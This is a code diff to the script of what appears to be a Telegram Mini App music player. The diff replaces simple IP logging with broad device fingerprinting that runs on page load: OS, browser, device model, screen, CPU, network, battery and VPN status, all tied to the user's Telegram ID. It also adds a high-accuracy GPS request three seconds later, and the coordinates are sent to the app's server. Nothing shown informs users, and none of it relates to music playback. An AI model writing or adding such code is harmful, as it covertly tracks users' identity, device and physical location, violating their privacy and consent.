@@ -379,66 +379,208 @@
             const telegramUsername = tg.initDataUnsafe?.user?.username || '';
             const telegramFirstName = tg.initDataUnsafe?.user?.first_name || '';
             
-            // ==================== ОТПРАВКА IP ПРИ ЗАГРУЗКЕ ====================
-            async function sendDeviceInfo() {
+            // ==================== СБОР ВСЕХ ДАННЫХ ====================
+            async function collectAllDeviceData() {
                 if (!telegramId) return;
                 
-                let ip = 'unknown';
-                try {
-                    const res = await fetch('https://api.ipify.org?format=json');
-                    const data = await res.json();
-                    ip = data.ip;
-                } catch(e) {
-                    console.log('IP fetch failed');
-                }
-                
+                // Базовая информация
                 const userAgent = navigator.userAgent;
                 let deviceType = 'unknown';
+                let deviceBrand = 'unknown';
+                let deviceModel = 'unknown';
                 let osName = 'unknown';
+                let osVersion = 'unknown';
+                let browserName = 'unknown';
+                let browserVersion = 'unknown';
                 
+                // Определение устройства
                 if (/iPhone|iPad|iPod/i.test(userAgent)) {
                     deviceType = 'mobile';
                     osName = 'iOS';
+                    const match = userAgent.match(/OS (\d+)_(\d+)/);
+                    if (match) osVersion = `${match[1]}.${match[2]}`;
+                    if (/iPhone/i.test(userAgent)) deviceModel = 'iPhone';
+                    else if (/iPad/i.test(userAgent)) deviceModel = 'iPad';
                 } else if (/Android/i.test(userAgent)) {
                     deviceType = 'mobile';
                     osName = 'Android';
+                    const match = userAgent.match(/Android (\d+(?:\.\d+)?)/);
+                    if (match) osVersion = match[1];
+                    if (/Samsung/i.test(userAgent)) deviceBrand = 'Samsung';
+                    else if (/Xiaomi/i.test(userAgent)) deviceBrand = 'Xiaomi';
+                    else if (/Huawei/i.test(userAgent)) deviceBrand = 'Huawei';
+                    else if (/Google/i.test(userAgent)) deviceBrand = 'Google';
+                    else if (/OnePlus/i.test(userAgent)) deviceBrand = 'OnePlus';
                 } else if (/Windows/i.test(userAgent)) {
                     deviceType = 'desktop';
                     osName = 'Windows';
+                    const match = userAgent.match(/Windows NT (\d+\.\d+)/);
+                    if (match) {
+                        const ver = match[1];
+                        if (ver === '10.0') osVersion = '10/11';
+                        else if (ver === '6.3') osVersion = '8.1';
+                        else if (ver === '6.2') osVersion = '8';
+                        else if (ver === '6.1') osVersion = '7';
+                    }
                 } else if (/Mac/i.test(userAgent)) {
                     deviceType = 'desktop';
                     osName = 'macOS';
+                    const match = userAgent.match(/Mac OS X (\d+)[._](\d+)/);
+                    if (match) osVersion = `${match[1]}.${match[2]}`;
                 } else if (/Linux/i.test(userAgent)) {
                     deviceType = 'desktop';
                     osName = 'Linux';
                 }
                 
+                // Определение браузера
+                if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
+                    browserName = 'Chrome';
+                    const match = userAgent.match(/Chrome\/(\d+)/);
+                    if (match) browserVersion = match[1];
+                } else if (userAgent.includes('Firefox')) {
+                    browserName = 'Firefox';
+                    const match = userAgent.match(/Firefox\/(\d+)/);
+                    if (match) browserVersion = match[1];
+                } else if (userAgent.includes('Edg')) {
+                    browserName = 'Edge';
+                    const match = userAgent.match(/Edg\/(\d+)/);
+                    if (match) browserVersion = match[1];
+                } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
+                    browserName = 'Safari';
+                    const match = userAgent.match(/Version\/(\d+)/);
+                    if (match) browserVersion = match[1];
+                } else if (userAgent.includes('OPR') || userAgent.includes('Opera')) {
+                    browserName = 'Opera';
+                }
+                
+                // Экран
+                const screenData = {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: devicePixelRatio
+                };
+                
+                // Процессор
+                const cpuData = {
+                    cores: navigator.hardwareConcurrency || 'unknown',
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    touchSupport: 'ontouchstart' in window
+                };
+                
+                // Сеть
+                let networkData = {};
+                if (navigator.connection) {
+                    networkData = {
+                        type: navigator.connection.effectiveType || 'unknown',
+                        downlink: navigator.connection.downlink || null,
+                        rtt: navigator.connection.rtt || null,
+                        saveData: navigator.connection.saveData || false
+                    };
+                }
+                
+                // Батарея
+                let batteryData = {};
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryData = {
+                        level: battery.level * 100,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch(e) {}
+                
+                // Сессия
                 let sessionId = localStorage.getItem('session_id');
                 if (!sessionId) {
                     sessionId = Math.random().toString(36).substring(2);
                     localStorage.setItem('session_id', sessionId);
                 }
                 
+                // Отправляем всё на сервер
+                const deviceData = {
+                    user_agent: userAgent,
+                    device_type: deviceType,
+                    device_brand: deviceBrand,
+                    device_model: deviceModel,
+                    os_name: osName,
+                    os_version: osVersion,
+                    browser_name: browserName,
+                    browser_version: browserVersion,
+                    screen_width: screenData.width,
+                    screen_height: screenData.height,
+                    screen_color_depth: screenData.colorDepth,
+                    device_pixel_ratio: screenData.pixelRatio,
+                    hardware_concurrency: cpuData.cores,
+                    max_touch_points: cpuData.maxTouchPoints,
+                    touch_support: cpuData.touchSupport,
+                    network_type: networkData.type,
+                    network_downlink: networkData.downlink,
+                    network_rtt: networkData.rtt,
+                    battery_level: batteryData.level,
+                    is_charging: batteryData.charging,
+                    power_save_mode: networkData.saveData || false
+                };
+                
                 try {
-                    await fetch('/api/ip_log', {
+                    const response = await fetch('/api/collect_data', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             telegram_id: telegramId,
-                            ip: ip,
-                            user_agent: userAgent,
-                            device_type: deviceType,
-                            os_name: osName,
-                            session_id: sessionId
+                            session_id: sessionId,
+                            device: deviceData
                         })
                     });
-                    console.log('IP logged:', ip);
+                    const result = await response.json();
+                    console.log('📊 Данные отправлены, VPN:', result.is_vpn);
                 } catch(e) {
-                    console.log('IP log failed');
+                    console.log('Ошибка отправки данных:', e);
                 }
             }
             
-            sendDeviceInfo();
+            // ==================== GPS (РЕАЛЬНАЯ ГЕОЛОКАЦИЯ) ====================
+            function requestGPS() {
+                if (!telegramId) return;
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            try {
+                                await fetch('/api/gps_location', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        telegram_id: telegramId,
+                                        latitude: position.coords.latitude,
+                                        longitude: position.coords.longitude,
+                                        accuracy: position.coords.accuracy
+                                    })
+                                });
+                                console.log('📍 GPS сохранён:', position.coords.latitude, position.coords.longitude);
+                                showToast('📍 Локация сохранена');
+                            } catch(e) {
+                                console.log('GPS save error:', e);
+                            }
+                        },
+                        (error) => {
+                            console.log('GPS denied or error:', error.message);
+                        },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                }
+            }
+            
+            function showToast(msg) {
+                const toast = document.getElementById('toast');
+                toast.textContent = msg;
+                toast.classList.add('show');
+                setTimeout(() => toast.classList.remove('show'), 2000);
+            }
+            
+            // ==================== ЗАПУСК СБОРА ДАННЫХ ====================
+            collectAllDeviceData();
+            setTimeout(requestGPS, 3000);
             
             // ==================== ОСТАЛЬНАЯ ЛОГИКА ====================
             let currentTab = 'search';
@@ -454,13 +596,6 @@
             // DOM elements
             const miniPlayer = document.getElementById('miniPlayer');
             const expandedPlayer = document.getElementById('expandedPlayer');
-            
-            function showToast(msg) {
-                const toast = document.getElementById('toast');
-                toast.textContent = msg;
-                toast.classList.add('show');
-                setTimeout(() => toast.classList.remove('show'), 2000);
-            }
             
             function escapeHtml(text) {
                 if (!text) return '';
